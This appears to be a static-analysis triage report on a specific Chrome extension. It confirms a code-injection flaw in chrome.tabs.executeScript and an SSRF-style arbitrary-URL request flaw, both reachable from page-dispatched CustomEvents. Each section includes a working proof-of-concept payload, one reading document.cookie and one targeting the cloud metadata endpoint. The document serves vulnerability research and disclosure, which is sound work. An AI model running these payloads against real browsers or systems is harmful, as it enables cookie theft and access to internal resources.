# CoCo Analysis: deiongpjjbocjmonefmnldjmmkgbpkmh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (chrome_tabs_executeScript_sink, XMLHttpRequest_url_sink)

---

## Sink 1: document_eventListener_OpenView → chrome_tabs_executeScript_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/deiongpjjbocjmonefmnldjmmkgbpkmh/opgen_generated_files/cs_0.js
Line 503   document.addEventListener('OpenView', function (evt) {
Line 504   chrome.runtime.sendMessage({ type: "OpenView", obj: evt.detail });

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/deiongpjjbocjmonefmnldjmmkgbpkmh/opgen_generated_files/bg.js
Line 1115   chrome.tabs.executeScript(tab.id, { code: "winName=\"checkseoview_" + request.Id + "_" + (request.Time * 1000) + "_" + spinView + "\";" });
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 503-508)
document.addEventListener('OpenView', function (evt) {
    chrome.runtime.sendMessage({ type: "OpenView", obj: evt.detail }); // ← attacker-controlled
    var event = document.createEvent('CustomEvent');
    event.initCustomEvent('OpenViewDone', true, false, evt.detail);
    document.dispatchEvent(event);
});

// Background script - Message handler (bg.js Line 1089-1119)
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.type == "OpenView") {
        request = request.obj; // ← attacker-controlled object
        var spinView = request.Name; // ← attacker-controlled
        var url = spinView.substring(0, spinView.indexOf(";"));
        if (spinView.indexOf(";") == -1) {
            url = spinView;
            spinView = "";
        } else {
            spinView = spinView.substring(spinView.indexOf(";") + 1);
        }
        chrome.tabs.getAllInWindow(null, function (tabs) {
            if (tabs.length > 15) {
                for (var i = 0; i < tabs.length; i++) {
                    if (!tabs[i].url.startsWith("https://seotobo.com/") && !tabs[i].url.startsWith("https://seotobo.com/")) {
                        chrome.tabs.remove(tabs[i].id);
                    }
                }
                listTab = [];
            }
        });
        chrome.tabs.create({
            url: url, // ← attacker-controlled URL
            selected: true
        }, function (tab) {
            listTab.push(tab.id);
            // Arbitrary code execution via attacker-controlled request.Id
            chrome.tabs.executeScript(tab.id, { code: "winName=\"checkseoview_" + request.Id + "_" + (request.Time * 1000) + "_" + spinView + "\";" }); // ← VULNERABLE
            request.Time += Math.floor(Math.random() * 30);
            setTimeout(function () { chrome.tabs.remove(tab.id); }, request.Time * 1000);
        });
        CheckTab();
    }
    // ... other handlers
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener (document.addEventListener)

**Attack:**

```javascript
// Malicious webpage code - exploit the vulnerability
var maliciousPayload = {
    Name: "https://attacker.com", // URL for tab creation
    Id: '\"; alert(document.cookie); //', // Code injection in executeScript
    Time: 10,
    RemoveCaptcha: false
};

var event = new CustomEvent('OpenView', { detail: maliciousPayload });
document.dispatchEvent(event);
```

**Impact:** Arbitrary JavaScript code execution in the context of the newly created tab. The attacker controls the `request.Id` field which is directly concatenated into JavaScript code passed to `chrome.tabs.executeScript`. By injecting a payload like `\"; alert(document.cookie); //`, the attacker can execute arbitrary JavaScript code. The extension has `activeTab` and `tabs` permissions along with broad host permissions (`http://*/*`, `https://*/*`), allowing code execution on any tab.

---

## Sink 2: document_eventListener_RequestLink → XMLHttpRequest_url_sink

**CoCo Trace:**
```
Similar flow from document.addEventListener('RequestLink') through chrome.runtime.sendMessage to XMLHttpRequest in background script
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 512-517)
document.addEventListener('RequestLink', function (evt) {
    if (evt.detail != null) {
        requestLinkTemp = evt.detail; // ← attacker-controlled
        RequestLinkCheck()
    }
});

// Content script sends message (cs_0.js Line 527)
chrome.runtime.sendMessage({ type: "RequestLink", obj: url, captcha: captcha, incognito: chrome.extension.inIncognitoContext, mobile: tempmobile }, ...);

// Background script - Message handler (bg.js Line 1132-1162)
else if (request.type == "RequestLink") {
    var linkUrl = request.obj; // ← attacker-controlled URL
    var mobile = request.mobile;
    if (linkUrl.localeCompare(spinUrlRequest) == 0) {
        sendResponse({
            response: spinUrlRequestData,
            linkUrl : linkUrl
        });
        // ... state management
    } else {
        if(linkUrl.startsWith('https://www.google.com/search')) {
            spinUrlRequest = linkUrl;
        }
        try {
            if (mobile) {
                checkIsMobile = mobile;
            }
            var x = new XMLHttpRequest();
            x.open('GET', linkUrl); // ← SSRF vulnerability: attacker-controlled URL
            x.responseType = 'text/plain';
            // ... response handling
            x.send();
        } catch (ex) {
        }
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener (document.addEventListener)

**Attack:**

```javascript
// Malicious webpage code - SSRF attack
var payload = {
    url: "http://169.254.169.254/latest/meta-data/", // AWS metadata endpoint
    mobile: null,
    captcha: false
};

var event = new CustomEvent('RequestLink', { detail: payload });
document.dispatchEvent(event);
```

**Impact:** Server-Side Request Forgery (SSRF). The attacker can trigger the extension to make privileged cross-origin requests to arbitrary URLs. With `webRequest` and `webRequestBlocking` permissions and broad host permissions, the extension can access internal networks, cloud metadata endpoints, or any URL the user's browser can reach, bypassing CORS restrictions. The response data flows back to the content script via `sendResponse`, allowing the attacker to read the response.
